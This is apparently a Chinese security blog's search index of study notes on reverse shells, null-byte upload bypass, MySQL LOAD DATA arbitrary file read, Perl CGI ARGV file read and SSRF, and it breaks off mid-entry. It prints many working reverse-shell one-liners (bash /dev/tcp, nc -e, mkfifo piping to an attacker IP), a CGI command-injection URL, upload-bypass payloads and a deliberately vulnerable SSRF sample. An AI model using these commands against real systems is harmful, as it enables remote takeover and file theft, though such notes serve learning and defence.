<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux反弹shell</title>
      <link href="/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2><blockquote><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></blockquote><a id="more"></a><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p><h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p><p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><p> 解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>) </p><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式： [n]&gt; word</p><p> 说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </p><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p><p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p><h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p><p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p><p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p><p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p><p> <strong>2.解析器再向后解析到 “&gt;”</strong> </p><h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;/&gt; file/[n]</p><p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p><p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h2><p> reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </p><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a><strong>为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a><strong>反弹shell的本质是什么</strong></h2><p>我们就以最常见的bash为例：<br>attacker机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>victim 机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>可以看到在攻击机上出现了受害者机器的shell</p><p>解释一下这条命令具体的含义：</p><p><strong>1.bash -i</strong></p><p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p><p>2）-i 这个参数表示的是产生交互式的shell</p><p><strong>2./dev/tcp/ip/port</strong></p><p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p><p> 但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 </p><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。 </p><p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p><p>于是我们似乎还需要一条这样的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 现在我们需要将两条指令结合起来 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> <strong>输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong> </p><p> <strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 </p><p><strong>4. &gt;&amp;、&amp;&gt;</strong></p><p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p><p>现在我们解决一下前面的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>当然我们也可以执行与之完全等价的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 </p><p>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句**</p><h2 id="常见的反弹shell-的语句怎么理解"><a href="#常见的反弹shell-的语句怎么理解" class="headerlink" title="常见的反弹shell 的语句怎么理解"></a><strong>常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure><p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p><strong>简单的解释一下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure><p>这个是一个非常经典的句子，它的原句是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure><p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p><p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p><p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure><p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><strong>简单的解释：</strong></p><p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p><p>类似的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00截断</title>
      <link href="/2020/04/21/00%E6%88%AA%E6%96%AD/"/>
      <url>/2020/04/21/00%E6%88%AA%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p><a href="00截断原理分析">https://blog.csdn.net/qq_26090065/article/details/81458937</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><a id="more"></a><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><p>加上%00</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p><p>就绕过了后缀限制，可以上传webshell啦。</p><h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><p> 然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00： </p><h1 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h1><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql任意文件读取</title>
      <link href="/2020/04/21/mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/04/21/mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/173039" target="_blank" rel="noopener">从一道ctf题学习mysql任意文件读取漏洞</a><br><a href="http://www.lin2zhen.top/index.php/archives/78/" target="_blank" rel="noopener">mysql任意文件读取漏洞学习</a><br><a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" rel="noopener">phpMyAdmin LOAD DATA INFILE 任意文件读取漏洞</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> mysql客户端登陆mysql服务端后，客户端执行语句<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，从而可以导致mysql进行本地或远程读取文件。这个原漏洞被爆出在去年<a href="http://aq.mk/index.php/archives/23/" target="_blank" rel="noopener">phpmyadmin任意文件读取漏洞</a>。 </p><a id="more"></a><p>如果phpmyadmin开启了如下选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg[&apos;AllowArbitraryServer&apos;] = true; //false改为true</span><br></pre></td></tr></table></figure><p>则登录时就可以访问远程的服务器。当登陆一个恶意构造的Mysql服务器时，即可利用load data infile读取该服务器上的任意文件。当然前提条件是<code>secure_file_priv</code>参数允许的目录下，且phpmyadmin的用户对该文件有读的权限。</p><h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a><strong>漏洞细节</strong></h1><p>LOAD DATA LOCAL导致的任意文件读取是个由来已久的问题，根据前人们的研究：</p><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a><br><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">MySQL connect file read</a><br>我们知道下列的下列情况都存在该问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL Client</span><br><span class="line">PHP + mysql/mysqli</span><br><span class="line">PHP + PDO (MYSQL_ATTR_LOCAL_INFILE)</span><br><span class="line">Python + MySQLdb</span><br><span class="line">Python3 + mysqlclient</span><br><span class="line">Java + JDBC Driver</span><br></pre></td></tr></table></figure><p>phpMyAdmin 属于典型的 php+mysqli 组合，当 AllowArbitraryServer 开启的情况下（默认关闭），我们可以让phpMyAdmin连接到恶意的MySQL服务器来触发任意文件读取漏洞。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p> <strong>EXP:</strong> <a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a> </p><p> <strong>1.</strong> 首先是配置恶意服务器。在db服务器的命令行里修改root/exp/rogue_mysql_server.py文件，设port为3306外的其他端口，这里设为3307，然后在filelist中选择一个要读取的文件。我们这里读取/etc/passwd文件。 </p><p> <strong>2.</strong> 运行python rogue_mysql_server.py，启动服务，服务会监听3307端口。 </p><p> <strong>3.</strong> 打开phpMyAdmin的登录页面，地址输入db:3307、用户密码随意输，提交登录 </p><p> 然后会发现生成一个mysql.log日志，查看日志 </p><p> 在日志中我们看到成功读取了passwd文件。 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2020/04/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/04/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>perl网页文件</title>
      <link href="/2020/03/26/perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6/"/>
      <url>/2020/03/26/perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="perl-CGI"><a href="#perl-CGI" class="headerlink" title="perl CGI"></a>perl CGI</h1><p>[<a href="https://www.guildhab.top/?p=867]" target="_blank" rel="noopener">https://www.guildhab.top/?p=867]</a>(Web – I-got-id-200 – WriteUp)</p><ul><li><p><strong>要使用 Perl CGI ， 首先要加载 CGI 模块</strong></p><p><strong><code>use CGI;</code></strong></p></li><li><p><strong>CGI模块具有预编程功能 ， 可用于Internet . 但在使用前必须创建CGI的句柄 =&gt; 允许我们访问相关的函数</strong></p><p><strong><code>my $cgi = CGI-&gt;new();</code></strong></p><p>现在 $cgi 正在加载 CGI 标准函数 , 有关 CGI 标准函数的内容可以参考 <strong><a href="http://www.freeoa.net/development/perl/perl-cgi-fun-intro_2195.html" target="_blank" rel="noopener">Perl CGI 主要函数功能简介</a></strong></p></li><li><p><strong>本题的环境是一个文件上传 ， 而在上面的链接中有讲到 upload() 这个CGI标准函数</strong></p><p>upload() 函数是用于处理文件上传的标准函数 ， 参数为在构造表单时 ` 设置的 name 的值 .</p><p>回到之前抓到的数据包 ， name 参数的值为 “ file ” , 文件上传的过程应该是这样的 :</p><p><strong><code>if ( $cgi-&gt;upload(&quot;file&quot;) ) { ... }</code></strong></p><p>if 语句确定了这是一个文件上传操作 ， <strong>后面的步骤都是在这个 if 语句中进行的</strong> .</p></li><li><p><strong>获取到参数</strong></p><p>在服务器处理之前 ， 需要先检索输入 . 再对它们进行处理 .</p><p><strong>在 Perl CGI 标准函数中 ， <code>param()</code> 函数用于获取传入的参数</strong>( 可以接收 GET方法 和 POST方法 传递的参数， 类似 PHP 中的 <code>$REQUEST</code> 全局变量 )</p><p>根据之前抓到的数据包 ， 这里的参数应该为 “ file “ ， 所以代码应该是这样的 .</p><p><strong><code>my $file= $cgi-&gt;param(&#39;file&#39; );</code></strong></p><p><em>下面就可以读取文件内容了</em></p></li><li><p><strong>读取文件</strong></p><p><strong>Perl 使用一种叫做文件句柄类型的变量来操作文件 ， 从文件读取或者写入数据都需要使用到文件句柄 .</strong></p><p><strong>文件句柄( file handle )是一个I/O连接的名称 , Perl 中提供了三种文件句柄 : STDIN , STDOUT , STDERR , 分别代表标准输入 ， 标准输出 ， 标准错误输出</strong></p><p><strong>这里就要使用到 Perl 中的尖括号运算符( &lt;&gt; )了</strong> , 它有如下的用途</p><ol><li>如果尖括号中间是文件句柄 ， 尖括号运算符允许读取文件句柄</li><li>如果尖括号中间是搜索模式 ， 尖括号运算符能返回与该模式相匹配的的文件列表 ，这被称为一个 glob ， 比如 &lt;*.bat&gt;</li><li>如果尖括号内没有任何内容 ， 那么它可以读取命令行上所有的文件内容 ， 如果没有文件名 ， 则可以读取标准输出</li></ol><p>这里需要使用 <strong>读取文件句柄</strong> 这个功能</p></li><li><p><strong>输出文件内容</strong></p><p>前面读取到了文件句柄 ， 那么如何输出文件的内容呢 ?</p><p><strong>这里要用到 Perl 中的特殊变量 <code>$_</code></strong></p><p><code>$_</code> 是默认参数的意思，指的是在不指定的情况下，程序处理的上一个变量 .</p><p><strong>比如打开一个文本文件 ， 读取每一行 ，在没有指定参数的情况下 ， <code>$_</code> 指向从文件中读取的每一行 .</strong></p><p>因此 ， 若想要读取某个文件的内容 ， <strong>可以写一个循环 ， 逐行读取文件的内容</strong></p><p><strong><code>while ( &lt;$file&gt; ) { print &quot;$_&quot;; }</code></strong></p><p> <strong>Perl 中的 ARGV 全局特殊文件句柄</strong> </p><ul><li><p>Perl 会将 perl 命令行参数列表放入到数组 @ARGV 中 ， 而默认情况下 ， 这些命令行参数是 Perl 的数据输入源 ， 也就是 <strong>Perl 会以依次将他们当作文件进行读取</strong></p></li><li><p><strong>param()函数会返回一个列表的文件 ， 但是根据后端代码 ， 只有第一个文件会被放入到 `` 变量中</strong></p><p><strong>这里就存在可利用的点!</strong></p></li><li><p><strong>如果在原来的数据包中新增一个文件上传项 ， 并且删除其 filename 参数 ，</strong> </p><blockquote><p><strong>在 URL 后添加的路径会被放入到 @ARGV 数组中 ， 配合之前引入的 ARGV 文件句柄 ， 我们就可以读取任意文件 !</strong> </p></blockquote></li></ul></li></ul><a id="more"></a><h1 id="param-函数"><a href="#param-函数" class="headerlink" title="param()函数"></a>param()函数</h1><p> param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的: </p><blockquote><p>bp进行抓包，将上传的文件类型及文件内容处复制再粘贴一行，将filename去掉，然后内容填入ARGV ，删除提交文件类型</p></blockquote><blockquote><p>perl文件遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/file.pl?/bin/bash%20-c%20ls$&#123;IFS&#125;/|</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2020/03/25/ssrf/"/>
      <url>/2020/03/25/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h1><p><a href="https://www.jianshu.com/p/90a34b08a416" target="_blank" rel="noopener">web安全之 – SSRF攻击</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>SSRF （Server-side Request Forge, 服务端请求伪造）</strong><br> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><a id="more"></a><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>举个栗子，漏洞代码ssrf.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 漏洞代码ssrf.php</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先curl查看版本以及支持的协议</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost <span class="symbol">:curl</span> -V</span><br><span class="line">curl <span class="number">7.54</span>.<span class="number">0</span> (x86_64-apple-darwin17.<span class="number">0</span>) libcurl/<span class="number">7.54</span>.<span class="number">0</span> LibreSSL/<span class="number">2.0</span>.<span class="number">20</span> zlib/<span class="number">1.2</span>.<span class="number">11</span> nghttp2/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line"><span 